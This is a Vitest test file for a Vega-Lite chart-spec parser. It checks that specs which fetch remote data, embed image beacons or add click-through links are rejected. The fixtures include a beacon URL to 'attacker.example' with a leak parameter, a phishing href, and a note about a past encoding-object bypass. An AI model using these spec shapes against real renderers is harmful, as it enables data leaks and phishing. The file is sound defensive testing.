import { describe, expect, it } from "vitest";
import { parseChartSpec } from "./chart-spec";

describe("chart spec parsing (RR-2) — inline data only, no remote fetch", () => {
  it("accepts a valid inline Vega-Lite spec", () => {
    const r = parseChartSpec(JSON.stringify({ mark: "bar", data: { values: [{ a: "x", b: 1 }] }, encoding: {} }));
    expect(r.ok).toBe(true);
  });

  it("REJECTS a spec that fetches a remote url (anywhere, any depth)", () => {
    expect(parseChartSpec(JSON.stringify({ mark: "line", data: { url: "https://evil.example/data.json" } })).ok).toBe(false);
    expect(parseChartSpec(JSON.stringify({ layer: [{ data: { url: "http://x/y" } }] })).ok).toBe(false);
  });

  it("rejects invalid JSON and non-objects", () => {
    expect(parseChartSpec("{not json").ok).toBe(false);
    expect(parseChartSpec("[1,2,3]").ok).toBe(false);
    expect(parseChartSpec('"a string"').ok).toBe(false);
  });

  // PBA-L3c-021 (lane PoC SEC-7, inverted): the url/href channels as encoding OBJECTS
  // bypassed the string-only check.
  it("REJECTS an image mark whose url channel is an encoding object", () => {
    const spec = { data: { values: [{ u: "https://attacker.example/beacon.png?leak=1" }] }, mark: "image", encoding: { url: { field: "u" }, x: { value: 0 }, y: { value: 0 } } };
    expect(parseChartSpec(JSON.stringify(spec)).ok).toBe(false);
  });

  it("REJECTS an href channel (link-out on click) and href mark properties", () => {
    expect(parseChartSpec(JSON.stringify({ data: { values: [{ h: "https://attacker.example/phish" }] }, mark: "point", encoding: { href: { field: "h" } } })).ok).toBe(false);
    expect(parseChartSpec(JSON.stringify({ data: { values: [] }, mark: { type: "point", href: "https://x" } })).ok).toBe(false);
  });

  it("REJECTS an image mark given as an object, and a url nested deeper than the inspection bound", () => {
    expect(parseChartSpec(JSON.stringify({ data: { values: [] }, mark: { type: "image" } })).ok).toBe(false);
    let deep: Record<string, unknown> = { data: { url: "https://x/y.json" } };
    for (let i = 0; i < 20; i++) deep = { layer: [deep] };
    expect(parseChartSpec(JSON.stringify(deep)).ok).toBe(false);
  });

  it("still accepts ordinary inline charts with nested layers", () => {
    const spec = { data: { values: [{ a: 1, b: 2 }] }, layer: [{ mark: "bar", encoding: { x: { field: "a" }, y: { field: "b" } } }, { mark: "rule" }] };
    expect(parseChartSpec(JSON.stringify(spec)).ok).toBe(true);
  });
});
